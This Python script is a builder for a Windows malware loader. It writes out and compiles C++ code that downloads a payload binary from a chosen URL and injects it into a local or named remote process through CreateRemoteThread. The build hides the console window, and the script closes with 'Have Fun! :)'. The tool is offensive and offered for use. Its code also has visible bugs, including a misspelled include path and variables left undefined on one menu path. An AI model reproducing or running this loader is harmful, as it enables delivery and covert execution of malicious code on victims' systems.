import subprocess
import os
import time

def build (Enumeration, ProcessName, Loader, Url):
    f = open ("main.cpp", "w")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Libraries/FetchFromURL.h"
#include "Libraires/{Enumeration}"
#include "Libraries/{Loader}"

using namespace std;

int main()
{{
    PBYTE  pPayloadAddress;
    DWORD pPayloadSize;
    string Url  = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
        cout << "Failed to fetch payload" << endl;
        return 0;
    }}

    //Encrypt(pPayloadAddress, pPayloadSize, NULL, NULL);

    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess)){{
        cout << "Failed to find remote process" << endl;
        return 0;
    }}  

    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
        cout << "Failed to execute payload" << endl;
        return 0;
    }}

    return 0;
}}
"""
)
    f.close()
    time.sleep(2)
    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -o chungus main.cpp -lwininet -lws2_32 -mwindows")
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

def print_chungus():


    print(
        f"""\n
 __ _  _ _ _   __                   
|  \ || | | | | _\                  
| -< \/ | | |_| v |                 
|__/\__/|_|___|__/ _                
| | | || |_   _| || |               
| 'V' || | | | | >< |               
!_/_\_!|_|_|_| |_||_| __ _  _   __  
 / _/ || | || |  \| |/ _] || |/' _/ 
| \_| >< | \/ | | ' | [/\ \/ |`._`. 
 \__/_||_|\__/|_|\__|\__/\__/ |___/                                                                                                                                
""")

def main():
    print_chungus()

    Url = input("""\nSet Payload Url or type local For localhost:8000 (test): 

    >> """)
    
    if Url == "local":
        Url = "http://localhost:8000/payload.bin"

    Loader = input("""\nEnter Injection Techinque: 
    1. Local Injection
    2. Remote Process Injection

    >> """)
 
    if Loader == "1":
        Loader = "LocalInjection.h"
    elif Loader == "2":
        Enumeration = input("""\nEnter Process/Thread Enumeration Techinque: 
    1. Enumeration via Snapshot

    >> """)
        if Enumeration == "1":
            Enumeration = "ProcessEnum32Snapshot.h"
            ProcessName = input("""\nEnter Target Process Name:
                                
    >> """)
            if ProcessName == "": 
                print("Invalid Input")
                exit()
        else:
            print("Invalid Input")
            exit()
        Loader = input("""\nEnter Injection Techinque:
    1. Remote Process Injection - (CreateRemoteThread)
                       
    >> """)
        if Loader == "1":
            Loader = "RemoteInjection.h"
                       
    else:
        print("Invalid Input")
        exit()

    if build(Enumeration, ProcessName, Loader, Url):
        print(f"\nPayload Built Successfully!\nHave Fun! :)")
    else:
        print(f"\nFailed to build payload :(")


if __name__ == "__main__":
    main()
